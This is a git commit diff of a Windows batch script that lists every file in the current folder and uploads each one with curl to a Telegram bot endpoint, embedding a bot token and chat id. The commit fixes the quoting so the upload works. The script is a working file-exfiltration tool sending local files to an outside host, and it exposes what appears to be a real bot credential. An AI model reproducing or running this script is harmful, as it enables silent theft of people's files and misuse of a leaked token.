abe441123d49ff7241d775f2437ff3ebbe35c1e6
pingme998 <77038591+pingme998@users.noreply.github.com>
2021-12-13 14:50:04 +0530

    Update 0up0to0teasing0bot0to0me.cmd

--- 0up0to0teasing0bot0to0me.cmd
+++ 0up0to0teasing0bot0to0me.cmd
@@ -1,3 +1,3 @@
 dir /b >list.txt
-powershell -Command "(gc list.txt) -replace '^', 'curl -F document=@"' -replace '$', '" https://api.telegram.org/bot2075322260:AAHwa3tRJuugVL03whnhUwoWFtOGBwpZ-gQ/sendDocument?chat_id=688448558' |cmd
+powershell -Command "(gc list.txt) -replace '^', 'curl -F document=@doublequotes180' -replace '$', 'doublequotes180 https://api.telegram.org/bot2075322260:AAHwa3tRJuugVL03whnhUwoWFtOGBwpZ-gQ/sendDocument?chat_id=688448558' -replace 'doublequotes180', '\"'  |cmd
 del list.txt
